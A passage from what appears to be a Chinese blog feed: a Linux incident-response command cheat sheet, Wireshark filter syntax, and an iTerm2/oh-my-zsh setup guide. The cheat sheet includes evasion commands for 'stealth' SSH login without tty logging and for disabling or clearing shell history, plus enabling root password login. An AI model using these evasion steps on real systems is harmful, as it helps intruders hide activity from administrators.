root，已经用户自定义安装软件的日志，也会在这里列出。</td></tr><tr><td>/var/log/secure</td><td>记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh的登录、su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr><tr><td>/var/log/wtmp</td><td>永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件。同样，这个文件也是二进制文件.不能直接用Vi查看，而要使用last命令查看</td></tr><tr><td>/var/tun/ulmp</td><td>记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看</td></tr></tbody></table><h2 id="3-基础查看信息杂项"><a href="#3-基础查看信息杂项" class="headerlink" title="3 基础查看信息杂项"></a>3 基础查看信息杂项</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看cup占用前十的进程ps auxw|head -1;ps auxw|sort -rn -k3|head -10#查看除root外，是否还有其他特权用户 uid&#x3D;0awk -F:&#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash#查看可以远程登录的账号信息awk &#39;&#x2F;$1|$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow#查看登录失败信息grep -o &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|uniq -ccat &#x2F;var&#x2F;log&#x2F;secure | grep &quot;Failed password&quot;| awk &#39;&#123;print $13&#125;&#39;#输出登录爆破的第一行和最后一行，确认爆破时间范围grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|head -1grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|tail -1#查看爆破的IPgrep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;auth.log | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more#sort可针对文本文件的内容，以行为单位来排序#Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用#爆破用户名字典都有哪些？grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr#登录成功的日期、用户名、IPgrep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lastlog列出所有用户最近登录的信息"><a href="#lastlog列出所有用户最近登录的信息" class="headerlink" title="lastlog列出所有用户最近登录的信息"></a><code>lastlog</code>列出所有用户最近登录的信息</h4><pre class="line-numbers language-none"><code class="language-none">lastlog&#96;引用的是&#96;&#x2F;var&#x2F;log&#x2F;lastlog&#96;文件中的信息，包括&#96;login-name&#96;、&#96;port&#96;、&#96;last login time<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="last-列出当前和曾经登入系统的用户信息"><a href="#last-列出当前和曾经登入系统的用户信息" class="headerlink" title="last 列出当前和曾经登入系统的用户信息"></a><code>last</code> 列出当前和曾经登入系统的用户信息</h4><p>它默认读取的是<code>/var/log/wtmp</code>文件的信息。输出的内容包括：用户名、终端位置、登录源信息、开始时间、结束时间、持续时间。注意最后一行输出的是<code>wtmp</code>文件起始记录的时间。当然也可以通过<code>last -f</code>参数指定读取文件，可以是<code>/var/log/btmp</code>、<code>/var/run/utmp</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">语法：last [-R] [-num] [ -n num ] [-adiowx] [ -f file ] [ -t YYYYMMDDHHMMSS ] [name...]  [tty...]例子：last -x ：显示系统关闭、用户登录和退出的历史last -i：显示特定ip登录的情况last -t  20181010120101： 显示20181010120101之前的登录信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lastb-列出失败尝试的登录信息"><a href="#lastb-列出失败尝试的登录信息" class="headerlink" title="lastb 列出失败尝试的登录信息"></a><code>lastb</code> 列出失败尝试的登录信息</h4><p>和<code>last</code>命令功能完全相同，只不过它默认读取的是<code>/var/log/btmp</code>文件的信息。当然也可以通过<code>last -f</code>参数指定读取文件，可以是<code>/var/log/btmp</code>、<code>/var/run/utmp</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#统计一下登录成功的IP有哪些grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more#除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;#禁用或删除多余及可疑的帐号usermod -L user    #禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头userdel user       #删除user用户userdel -r user    #将删除user用户，并且将&#x2F;home目录下的user目录一并删除#增加一个用户kali日志grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure#删除用户kali日志#查看谁有sudo授权执行权限(权限级别)sudo -lgrep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure#sudo 授权执行#查看谁有sudo授权执行权限(权限级别)sudo -l#使用ps命令，分析进程ps aux | grep pid (pid表示pid号)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-专项使用"><a href="#4-专项使用" class="headerlink" title="4 专项使用"></a>4 专项使用</h2><h3 id="4-1-ssh"><a href="#4-1-ssh" class="headerlink" title="4.1 ssh"></a>4.1 ssh</h3><h4 id="4-1-1-ssh登录信息"><a href="#4-1-1-ssh登录信息" class="headerlink" title="4.1.1 ssh登录信息"></a>4.1.1 ssh登录信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看当前登录用户（tty本地登陆  pts远程登录）root@iZbp19pfnyuhlghdkeobejZ:~# whoroot     pts&#x2F;0        2020-03-18 10:24 (X.X.X.X)root     pts&#x2F;1        2020-03-18 10:24 (X.X.X.X)#查看当前登录用户root@iZbp19pfnyuhlghdkeobejZ:~# lastroot     pts&#x2F;2        (X.X.X.X)    Wed Mar 18 10:25   still logged inroot     pts&#x2F;1        (X.X.X.X)    Wed Mar 18 10:24 - 10:30  (00:05)root     pts&#x2F;0        (X.X.X.X)    Wed Mar 18 10:24 - 10:25  (00:01)root     pts&#x2F;0        (X.X.X.X)   Wed Mar 18 00:12 - 00:17  (00:04)reboot   system boot  4.9.0-11-amd64   Wed Mar 18 08:12   still running#查看登陆多久、多少用户，负载root@iZbp19pfnyuhlghdkeobejZ:~# uptime 23:00:23 up 22:47,  2 users,  load average: 0.00, 0.01, 0.00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-1-2-ssh隐身登录"><a href="#4-1-2-ssh隐身登录" class="headerlink" title="4.1.2 ssh隐身登录"></a>4.1.2 ssh隐身登录</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ssh -T root@192.168.1.1 &#x2F;bin&#x2F;bash -issh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T root@192.168.1.1 &#x2F;bin&#x2F;bash -if<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-1-3-ssh端口复用"><a href="#4-1-3-ssh端口复用" class="headerlink" title="4.1.3 ssh端口复用"></a>4.1.3 ssh端口复用</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#安装SSLHapt install sslh# 配置SSLH# 编辑 SSLH 配置文件：sudo vi &#x2F;etc&#x2F;default&#x2F;sslh#1、找到下列行：Run&#x3D;no  将其修改为：Run&#x3D;yes#2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443DAEMON_OPTS&#x3D;&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile &#x2F;var&#x2F;run&#x2F;sslh&#x2F;sslh.pid&quot;service sslh start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-1-4-SSH登录"><a href="#4-1-4-SSH登录" class="headerlink" title="4.1.4 SSH登录"></a>4.1.4 SSH登录</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看ssh服务状态&#x2F;etc&#x2F;init.d&#x2F;ssh status如果显示为Active: inactive (dead)就表示没有开启#修改配置文件vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config#原来文件内容#PermitRootLogin prohibit-password#PasswordAuthentication yes#修改后的内容PermitRootLogin yesPasswordAuthentication yes#启动ssh&#x2F;etc&#x2F;init.d&#x2F;ssh start#开机自启update-rc.d ssh enable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-histroy"><a href="#4-2-histroy" class="headerlink" title="4.2 histroy"></a>4.2 histroy</h3><p>两个<code>histroy</code>是命令输入可以直接查看历史执行过命令，<code>.bash_history</code>是文件需要复制到别的文件中查看</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#历史操作命令清除history -c#但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。#历史命令查看#把文件内容发送到history.txt文件中cat .bash_history &gt;&gt; history.txt#直接查看histroy#隐藏历史操作命令#命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。#关闭历史记录#[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录[space]set +o history#开启历史记录#执行命令之后的命令都会出现在历史中。[Space]set -o history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-netstat"><a href="#4-3-netstat" class="headerlink" title="4.3 netstat"></a>4.3 netstat</h3><p>使用<code>netstat </code>网络连接命令，分析可疑端口、<code>IP</code>、<code>PID</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netstat -antlp|more!netlsof -i:80  #查看指定端口netstat -anp|grep 158.x.x.x  #从连接的IP来定位PID，如果是瞬时建立的才找不到#查看下&#96;pid&#96;所对应的进程文件信息ls -l &#x2F;proc&#x2F;$PID&#x2F;   #可以查看详细进程信息file &#x2F;proc&#x2F;$PID&#x2F;exe #（$PID 为对应的pid 号）cd &#x2F;proc&#x2F;$PID    #可以进入该进程目录ll &#x2F;proc&#x2F;PID   #查看程序对应的启动位置which XXXX      #查看程序在哪个文件夹 XXXX表示程序名 lsof &#x2F;usr&#x2F;bin&#x2F;*  #查看某个路径下的运行中的进程列表pidof &#x2F;usr&#x2F;bin&#x2F;*  #查看某个路径下运行进程的 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-4-查看定时任务"><a href="#4-4-查看定时任务" class="headerlink" title="4.4 查看定时任务"></a>4.4 查看定时任务</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">crontab -l #查看当前用户定时任务cat &#x2F;etc&#x2F;crontab  #查看定时任务的文件里面是否存在定时任务ls -al &#x2F;var&#x2F;spool&#x2F;cron&#x2F;*        cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;*  #查看文件夹里面是否有其他定时任务的文件ls -al &#x2F;etc&#x2F;cron.d&#x2F;*for u in &#96;cat &#x2F;etc&#x2F;passwd |cut -d  &quot;:&quot; -f1&#96;;do crontab -l -u $u; done  #查看所有用户的定时任务crontab -r #表面上删除定时任务crontab -e  #编辑定时任务解读#前面5个星分别代表分-时-天-月-星期 后面跟命令*     * ***command#（表示每15分钟运行一次）*&#x2F;15  * ***command<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-查看ssh密钥"><a href="#4-5-查看ssh密钥" class="headerlink" title="4.5 查看ssh密钥"></a>4.5 查看ssh密钥</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat .ssh&#x2F;authorized_keys  #查看命令&#x2F;root&#x2F;.ssh&#x2F;authorized_keys  #ssh秘钥文件所在路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-6-查看CPU运行"><a href="#4-6-查看CPU运行" class="headerlink" title="4.6 查看CPU运行"></a>4.6 查看CPU运行</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">top<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-7-结束进程"><a href="#4-7-结束进程" class="headerlink" title="4.7 结束进程"></a>4.7 结束进程</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kill PIDkill -9 PID #彻底杀死进程kill -KILL PID  #强制杀死进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-8-查看进程"><a href="#4-8-查看进程" class="headerlink" title="4.8 查看进程"></a>4.8 查看进程</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ps -a #列出的是当前控制终端启动的进程ps -A #系统全部启动进程ps auxf #查看父进程关联的子进程ps -aux #枚举进程命令行,病毒一般都携带可疑的命令行，比如带有url等奇怪的字符串时pstree　#查看进程树<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-9-开机启动的一些路径"><a href="#4-9-开机启动的一些路径" class="headerlink" title="4.9 开机启动的一些路径"></a>4.9 开机启动的一些路径</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;etc&#x2F;rc.d&#x2F;rc&#x2F;etc&#x2F;rc&#x2F;etc&#x2F;rc.local&#x2F;etc&#x2F;rc.d&#x2F;rc.local&#x2F;etc&#x2F;rc.d&#x2F;rc&#x2F;etc&#x2F;rc$runlevel.d&#x2F; #该目录下都是链接的可执行文件，也可以自己添加可执行程序&#x2F;etc&#x2F;ld.so.cache   &#x2F;etc&#x2F;ld.so.preload &#x2F;usr&#x2F;local&#x2F;lib&#x2F;libioset.so&#x2F;etc&#x2F;init.d#另外一个添加启动项的地方在  &#x2F;etc&#x2F;profile里面，还有  &#x2F;etc&#x2F;profile.d&#x2F;目录下以sh结尾的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-10-封禁IP"><a href="#4-10-封禁IP" class="headerlink" title="4.10 封禁IP"></a>4.10 封禁IP</h3><p>参数<code>-I</code>是表示<code>Insert</code>（添加），<code>-D</code>表示<code>Delete</code>（删除）。后面跟的是规则，<code>INPUT</code>表示入站，<code>1.1.1.1</code>表示要封停的<code>IP</code>，<code>DROP</code>表示放弃连接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptables -I INPUT -s 1.1.1.1 -j DROP  #封禁IP进口iptables -I OUTPUT -s 1.1.1.1&#x2F;24 -j DROP#封禁IP出口iptables -I INPUT -s 1.1.1.1&#x2F;24 -j DROP  #封禁IP段iptables --list  #查看规则<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>对<code>IP</code>限制后保存信息</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install iptables-serviceschkconfig iptables onservice iptables savecat &#x2F;etc&#x2F;sysconfig&#x2F;iptablesservice iptables startiptables -nL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-11-查看系统服务"><a href="#4-11-查看系统服务" class="headerlink" title="4.11 查看系统服务"></a>4.11 查看系统服务</h3><ul><li>如果删除了计划任务，还有文件删除不了 可以查看系统服务是否存在病毒</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chkconfig –list        #列出所有的系统服务chkconfig –add httpd        #增加httpd服务chkconfig –del httpd        #删除httpd服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-12-文件下载"><a href="#4-12-文件下载" class="headerlink" title="4.12 文件下载"></a>4.12 文件下载</h3><ul><li>如果关闭了<code>FTP</code>，又无法使用<code>xftp</code>访问卡原始用<code>scp</code>命令下载</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">scp -r 目标文件路径  root@1.1.1.1:&#x2F;home&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-13-文件限制"><a href="#4-13-文件限制" class="headerlink" title="4.13 文件限制"></a>4.13 文件限制</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chmod 000 &#x2F;usr&#x2F;bin&#x2F;XXXXXX  #设置一个文件权限为空(就是什么权限都没有chattr +i &#x2F;usr&#x2F;bin   #限制对&#x2F;usr&#x2F;bin路径修改chattr -i &#x2F;usr&#x2F;bin  #开放对&#x2F;usr&#x2F;bin路径修改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-14-alias-定义或显示别名"><a href="#4-14-alias-定义或显示别名" class="headerlink" title="4.14 alias  定义或显示别名"></a>4.14 alias  定义或显示别名</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 显示全部已定义的别名aliasalias -p# 显示已定义的别名（假设当前环境存在以下别名）alias lsalias ls grep# 定义或修改别名的值alias ls&#x3D;&#39;ls --color&#x3D;auto&#39;alias ls&#x3D;&#39;ls --color&#x3D;never&#39; grep&#x3D;&#39;grep --color&#x3D;never&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark 语法</title>
      <link href="2020/05/27/wireshark-yu-fa/"/>
      <url>2020/05/27/wireshark-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark语法"><a href="#Wireshark语法" class="headerlink" title="Wireshark语法"></a>Wireshark语法</h1><span id="more"></span><h2 id="1-1-过滤IP"><a href="#1-1-过滤IP" class="headerlink" title="1.1 过滤IP"></a>1.1 过滤IP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ip.src eq ## ip.src &#x3D;&#x3D; 显示来源IPip.dst eq ## ip.dst &#x3D;&#x3D; 显示目的IPip.addr eq ##显示IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="1-2-过滤端口"><a href="#1-2-过滤端口" class="headerlink" title="1.2 过滤端口"></a>1.2 过滤端口</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcp.port eq 3306 #不管端口是来源还是目标都显示tcp.dstport&#x3D;&#x3D;80 #只显示tcp协议的目标端口80tcp.srcport&#x3D;&#x3D;80 #只显示tcp协议的来源端口80tcp.port&gt;&#x3D;1 and tcp.port &lt;&#x3D;80 #过滤端口范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-3-过滤协议"><a href="#1-3-过滤协议" class="headerlink" title="1.3 过滤协议"></a>1.3 过滤协议</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcpudparpicmphttpsmtpfrpdnsmsnmsipssloicpbootp!arp &#x2F; not arp #排除ARP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-4-过滤MAC"><a href="#1-4-过滤MAC" class="headerlink" title="1.4 过滤MAC"></a>1.4 过滤MAC</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">　eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤目标mac　　eth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源mac　　eth.dst&#x3D;&#x3D;A0:00:00:04:C5:84　　eth.dst&#x3D;&#x3D;A0-00-00-04-C5-84　　eth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的　　less than 小于 &lt; lt　　小于等于 le　　等于 eq　　大于 gt　　大于等于 ge　　不等 ne<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-5包长度过滤"><a href="#1-5包长度过滤" class="headerlink" title="1.5包长度过滤"></a>1.5包长度过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">udp.length &#x3D;&#x3D; 26 这个长度是指udp本身固定长度8加上udp下面那块数据包之和　　tcp.len &gt;&#x3D; 7 指的是ip数据包(tcp下面那块数据),不包括tcp本身　　ip.len &#x3D;&#x3D; 94 除了以太网头固定长度14,其它都算是ip.len,即从ip本身到最后　　frame.len &#x3D;&#x3D; 119 整个数据包长度,从eth开始到最后　　eth —&gt; ip or arp —&gt; tcp or udp —&gt; data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-6-http-模式过滤"><a href="#1-6-http-模式过滤" class="headerlink" title="1.6 http 模式过滤"></a>1.6 http 模式过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">　http.request.method &#x3D;&#x3D; &quot;GET”　　http.request.method &#x3D;&#x3D; &quot;POST”　　http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo-edu.gif”　　http contains &quot;GET”　　http contains &quot;HTTP&#x2F;1.”　　&#x2F;&#x2F; GET包　　http.request.method &#x3D;&#x3D; &quot;GET” &amp;&amp; http contains &quot;Host: &quot;　　http.request.method &#x3D;&#x3D; &quot;GET” &amp;&amp; http contains &quot;User-Agent: &quot;　　&#x2F;&#x2F; POST包　　http.request.method &#x3D;&#x3D; &quot;POST” &amp;&amp; http contains &quot;Host: &quot;　　http.request.method &#x3D;&#x3D; &quot;POST” &amp;&amp; http contains &quot;User-Agent: &quot;　　&#x2F;&#x2F; 响应包　　http contains &quot;HTTP&#x2F;1.1 200 OK” &amp;&amp; http contains &quot;Content-Type: &quot;　　http contains &quot;HTTP&#x2F;1.0 200 OK” &amp;&amp; http contains &quot;Content-Type: &quot;　　一定包含如下　　Content-Type:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-7-TCP-参数过滤"><a href="#1-7-TCP-参数过滤" class="headerlink" title="1.7 TCP 参数过滤"></a>1.7 TCP 参数过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcp.flags 显示包含TCP标志的封包。　　tcp.flags.syn &#x3D;&#x3D; 0x02 显示包含TCP SYN标志的封包。　　tcp.window_size &#x3D;&#x3D; 0 &amp;&amp; tcp.flags.reset !&#x3D; 1　　8.包内容过滤　　tcp[20]表示从20开始，取1个字符　　tcp[20:]表示从20开始，取1个字符以上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iterm2配置</title>
      <link href="2020/03/10/iterm2-pei-zhi/"/>
      <url>2020/03/10/iterm2-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="ITerm2-配置"><a href="#ITerm2-配置" class="headerlink" title="ITerm2 配置"></a>ITerm2 配置</h1><span id="more"></span><h2 id="1-安装oh-my-zsh"><a href="#1-安装oh-my-zsh" class="headerlink" title="1 安装oh-my-zsh"></a>1 安装oh-my-zsh</h2><h3 id="1-1-查看系统存在几个shell"><a href="#1-1-查看系统存在几个shell" class="headerlink" title="1.1 查看系统存在几个shell"></a>1.1 查看系统存在几个shell</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;etc&#x2F;shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># List of acceptable shells for chpass(1).# Ftpd will not allow users to connect who are not using# one of these shells.&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;csh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bash是mac中terminal自带的shell，把它换成zsh，这个的功能要多得多。拥有语法高亮，命令行tab补全，自动提示符，显示Git仓库状态等功能</p><p>设置默认shell</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chsh -s &#x2F;bin&#x2F;zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-安装oh-my-zsh"><a href="#1-2-安装oh-my-zsh" class="headerlink" title="1.2 安装oh-my-zsh"></a>1.2 安装oh-my-zsh</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">https:&#x2F;&#x2F;github.com&#x2F;ohmyzsh&#x2F;ohmyzsh #github地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cp -r ohmyzsh ~&#x2F;.oh-my-zsh## 复制.zshrccp ohmyzsh&#x2F;templates&#x2F;zshrc.zsh-template ~&#x2F;.zshrc## shell换成zshchsh -s &#x2F;bin&#x2F;zsh #安装好之后，需要把 Zsh 设置为当前用户的默认 Shell（这样新建标签的时候才会使用 Zsh）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之前.zshrc 配置了mvn,记得重新加上</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">MAVEN_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;apache-maven-3.6.3PATH&#x3D;$MAVEN_HOME&#x2F;bin:$PATHexport MAVEN_HOMEexport PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>主题修改为<code>ZSH_THEME=&quot;agnoster&quot;</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim ~&#x2F;.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/03/10/iterm2-pei-zhi/img-1.png" class="slug"><!--`agnoster`是比较常用的 zsh 主题之一，你可以挑选你喜欢的主题，zsh 主题列表：[https://github.com/robbyrussell/oh-my-zsh/wiki/themes](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Frobbyrussell%2Foh-my-zsh%2Fwiki%2Fthemes)--><h3 id="1-3-配置Meslo字体"><a href="#1-3-配置Meslo字体" class="headerlink" title="1.3 配置Meslo字体"></a>1.3 配置Meslo字体</h3><p>使用上面的主题，需要 Meslo 字体支持，要不然会出现乱码的情况，字体下载地址：<a href="https://links.jianshu.com/go?to=https://github.com/powerline/fonts/blob/master/Meslo%20Slashed/Meslo%20LG%20M%20Regular%20for%20Powerline.ttf">Meslo LG M Regular for Powerline.ttf</a></p><p>下载好之后，找到对应的字体,直接在 Mac OS 中安装即可。</p><p>然后打开 iTerm2，按<code>Command + ,</code>键，打开 Preferences 配置界面，然后<code>Profiles -&gt; Text -&gt; Font -&gt; Chanage Font</code>，选择 Meslo LG M Regular for Powerline 字体。</p><h3 id="1-4-声明高亮"><a href="#1-4-声明高亮" class="headerlink" title="1.4 声明高亮"></a>1.4 声明高亮</h3><p>特殊命令和错误命令，会有高亮显示。</p><p>使用 Homebrew 安装：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ brew install zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装成功之后，编辑vim ~/.zshrc文件，在最后一行增加下面配置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">source &#x2F;usr&#x2F;local&#x2F;share&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-5-自动建议填充"><a href="#1-5-自动建议填充" class="headerlink" title="1.5 自动建议填充"></a>1.5 自动建议填充</h3><p>这个功能是非常实用的，可以方便我们快速的敲命令</p><p>配置步骤，先克隆zsh-autosuggestions项目，到指定目录：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions # github地址mv zsh-autosuggestions ~&#x2F;.oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后编辑<code>vim 